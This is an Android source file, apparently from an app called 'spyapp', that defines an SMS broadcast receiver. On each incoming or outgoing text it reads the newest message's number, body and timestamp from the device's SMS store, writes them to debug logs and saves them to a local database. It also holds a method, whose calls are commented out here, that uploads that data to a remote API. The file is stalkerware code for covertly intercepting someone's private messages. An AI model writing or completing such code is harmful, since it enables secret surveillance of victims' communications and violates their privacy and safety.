package com.app.spyapp.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Utils;
import com.app.spyapp.common.WriteLog;
import com.app.spyapp.helper.APIService;
import com.app.spyapp.helper.APIUtils;
import com.app.spyapp.helper.ConstantData;
import com.app.spyapp.helper.apiModel.MessageResp;
import com.app.spyapp.model.SMSModel;

import java.io.UnsupportedEncodingException;
import java.sql.Date;
import java.util.HashMap;
import java.util.Map;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import static android.content.Context.MODE_PRIVATE;


public class SMSReceiver extends BroadcastReceiver {
    private SpyApp spyApp;

    private APIService apiService;
    private SharedPreferences sharedPreferences;
    private SharedPreferences.Editor editor;
    private int type;
    private String phone,body;
    private Date date;


    @Override
    public void onReceive(Context context, Intent intent) {
        spyApp = (SpyApp) context.getApplicationContext();

        apiService = APIUtils.getAPIService();
        sharedPreferences = context.getSharedPreferences(ConstantData.PREF_NAME, MODE_PRIVATE);
        editor = sharedPreferences.edit();

        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            //do something with the received sms
            getReceivedSMSinfo(context);
        } else if (intent.getAction().equals("android.provider.Telephony.SMS_SENT")) {
            //do something with the sended sms
            getSentSMSinfo(context);
        }
    }

    //method to get details about received SMS..........
    private void getReceivedSMSinfo(Context context) {
        Uri uri = Uri.parse("content://sms/inbox");
        String str = "";
        Cursor cursor = context.getContentResolver().query(uri, null,
                null, null, null);
        cursor.moveToNext();

        // 1 = Received, etc.
        type = cursor.getInt(cursor.getColumnIndex("type"));
        String msg_id = cursor.getString(cursor.getColumnIndex("_id"));
        phone = cursor.getString(cursor.getColumnIndex("address"));
        String dateVal = cursor.getString(cursor.getColumnIndex("date"));
        body = cursor.getString(cursor.getColumnIndex("body"));
        date = new Date(Long.valueOf(dateVal));

        Log.i("Debug", "Received SMS phone is: " + phone);
        Log.i("Debug", "SMS type is: " + type);
        Log.i("Debug", "SMS time stamp is:" + date);
        Log.i("Debug", "SMS body is: " + body);
        Log.i("Debug", "SMS id is: " + msg_id);

//        smsDetail(phone,"INCOMING",date,body);
       // new NetworkAccess().execute();

        SMSModel smsModel = new SMSModel();
        smsModel.setMessageId(msg_id);
        smsModel.setMsg(body);
        smsModel.setAddress(phone);
        smsModel.setType(Const.TYPE_RECEIVE_STRING);
        smsModel.setDate(Utils.convertMilisToDate(date.getTime()));
        if (!spyApp.getDatabaseHelper().isSmsAvailable(smsModel.getMessageId())) {
            spyApp.getDatabaseHelper().insertSMS(smsModel);
        }
    }

    //method to get details about Sent SMS...........
    private void getSentSMSinfo(Context context) {
        Uri uri = Uri.parse("content://sms/sent");
        String str = "";
        Cursor cursor = context.getContentResolver().query(uri, null,
                null, null, null);
        cursor.moveToNext();

        // 2 = sent, etc.
        type = cursor.getInt(cursor.getColumnIndex("type"));
        String msg_id = cursor.getString(cursor.getColumnIndex("_id"));
        phone = cursor.getString(cursor.getColumnIndex("address"));
        String dateVal = cursor.getString(cursor.getColumnIndex("date"));
        body = cursor.getString(cursor.getColumnIndex("body"));
        date = new Date(Long.valueOf(dateVal));

        Toast.makeText(context, "MSSSS"+str, Toast.LENGTH_SHORT).show();



        Log.i("Debug", "sent SMS phone is: " + phone);
        Log.i("Debug", "SMS type is: " + type);
        Log.i("Debug", "SMS time stamp is:" + date);
        Log.i("Debug", "SMS body is: " + body);
        Log.i("Debug", "SMS id is: " + msg_id);

      //  new NetworkAccess().execute();
//        smsDetail(phone,"OUTGOING",date,body);


        SMSModel smsModel = new SMSModel();
        smsModel.setMessageId(msg_id);
        smsModel.setMsg(body);
        smsModel.setAddress(phone);
        smsModel.setType("sent");
        smsModel.setDate(Utils.convertMilisToDate(date.getTime()));
        if (!spyApp.getDatabaseHelper().isSmsAvailable(smsModel.getMessageId())) {
            spyApp.getDatabaseHelper().insertSMS(smsModel);
        }

    }


    private void smsDetail(String phone,String type,Date date,String body){
        final Map<String, Object> requestBodyMap = new HashMap<>();
        requestBodyMap.put("sender_number", phone.toString());
        requestBodyMap.put("receiver_number", phone.toString());
        requestBodyMap.put("body", body.toString());
        requestBodyMap.put("type",type.toString());
        requestBodyMap.put("time", date.getTime());

        apiService.newSMS(sharedPreferences.getString(ConstantData.TOKEN, ""),requestBodyMap)
                .enqueue(new Callback<MessageResp>() {
                    @Override
                    public void onResponse(Call<MessageResp> call, Response<MessageResp> response) {
                        if (response.isSuccessful()){
                            if (response.body() != null);
                            Toast.makeText(spyApp, ""+response.body().getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    }

                    @Override
                    public void onFailure(Call<MessageResp> call, Throwable t) {
                        Toast.makeText(spyApp, "Fail", Toast.LENGTH_SHORT).show();
                    }
                });
    }




    ////

    public class NetworkAccess extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            // call some loader
        }
        @Override
        protected Void doInBackground(Void... params) {
            if (type ==1) {
//                smsDetail(phone, "OUTGOING", date, body);
            }else if(type == 2){
//                smsDetail(phone, "INCOMING", date, body);
            }
            // Do background task
//            sendhttprequest("http://example.com/product", "rl", "12345678");
            return null;
        }

        @Override
        protected void onPostExecute(Void result) {

            super.onPostExecute(result);
            // dismiss loader
            // update ui
        }
    }



}

